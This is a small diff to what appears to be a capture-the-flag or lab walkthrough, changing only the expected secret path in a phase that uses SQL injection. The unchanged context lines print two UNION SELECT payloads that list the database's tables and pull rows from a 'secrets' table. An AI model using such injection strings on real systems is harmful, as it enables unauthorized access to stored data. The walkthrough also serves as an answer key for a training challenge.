@@ -64,7 +64,7 @@ admin' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'--
 admin' UNION SELECT note,owner,3 FROM secrets--
 ```
 
-**Expected Result**: You should get the secret `/assets/inspect.png` from the secrets table.
+**Expected Result**: You should get the secret `/inspect.png` from the secrets table.
 
 ### Phase 2: Code Analysis
 **Objective**: Find hidden hash fragments in the dashboard code.
